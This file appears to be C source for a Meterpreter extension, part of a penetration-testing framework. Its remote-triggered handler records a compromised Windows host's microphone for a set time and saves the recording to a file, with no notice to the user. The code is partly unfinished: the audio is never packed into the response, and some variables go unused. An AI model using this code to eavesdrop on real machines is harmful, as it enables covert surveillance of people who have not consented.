#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>
#include "webcam.h"


#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "winmm.lib")

#define capSendMessage(hWnd, uMsg, wParm, lParam) ((IsWindow(hWnd)) ? SendMessage(hWnd, uMsg, (WPARAM)(wParm), (LPARAM)(lParam)) : 0)

BOOL capmicaudio(char *szFile, int millisecs) 
{
	UINT wDeviceID;
    DWORD dwReturn;
    MCI_OPEN_PARMS mciOpenParms;
    MCI_RECORD_PARMS mciRecordParms;
    MCI_SAVE_PARMS mciSaveParms;
    MCI_PLAY_PARMS mciPlayParms;
	DWORD dwMilliSeconds;

	dwMilliSeconds = millisecs;

    // Open a waveform-audio device with a new file for recording.
    mciOpenParms.lpstrDeviceType = "waveaudio";
    mciOpenParms.lpstrElementName = "";
    if (dwReturn = mciSendCommand(0, MCI_OPEN,MCI_OPEN_ELEMENT | MCI_OPEN_TYPE,(DWORD)(LPVOID) &mciOpenParms))
    {
        // Failed to open device; don't close it, just return error.
        return (dwReturn);
    }

    // The device opened successfully; get the device ID.
    wDeviceID = mciOpenParms.wDeviceID;

    mciRecordParms.dwTo = dwMilliSeconds;
    if (dwReturn = mciSendCommand(wDeviceID, MCI_RECORD, 
        MCI_TO | MCI_WAIT, (DWORD)(LPVOID) &mciRecordParms))
    {
        mciSendCommand(wDeviceID, MCI_CLOSE, 0, (DWORD_PTR)0 );
        return (dwReturn);
    }

    // Play the recording and query user to save the file.
    mciPlayParms.dwFrom = 0L;
    
    // Save the recording to a file. Wait for
    // the operation to complete before continuing.
	mciSaveParms.lpfilename = szFile;
    if (dwReturn = mciSendCommand(wDeviceID, MCI_SAVE, MCI_SAVE_FILE | MCI_WAIT, (DWORD)(LPVOID) &mciSaveParms))
    {
        mciSendCommand(wDeviceID, MCI_CLOSE, 0, (DWORD_PTR)0 );
        return (dwReturn);
    }

    return (0L);
}




int __declspec(dllexport) controlmic(char **waveresults, int msecs) {
	DWORD dwError = 0;
	char *wavestring = NULL;

	/* METERPRETER CODE */
	// char buffer[100];
	/* END METERPRETER CODE */

	capmicaudio("C:\\test.wav", msecs);

	*waveresults = wavestring;

	/* return the correct code */
	return dwError;
}


/*
 * Grabs the audio from mic.
 */
DWORD request_audio_get_dev_audio(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	char *wave = NULL;

	if (controlmic(&wave,packet_get_tlv_value_uint(packet, TLV_TYPE_DEV_RECTIME)))
	{
		res = GetLastError();
	}

	//packet_add_tlv_string(response, TLV_TYPE_DEV_AUDIO, wave);


	packet_transmit_response(res, remote, response);

	if (wave)
	free(wave);

	return res;
}
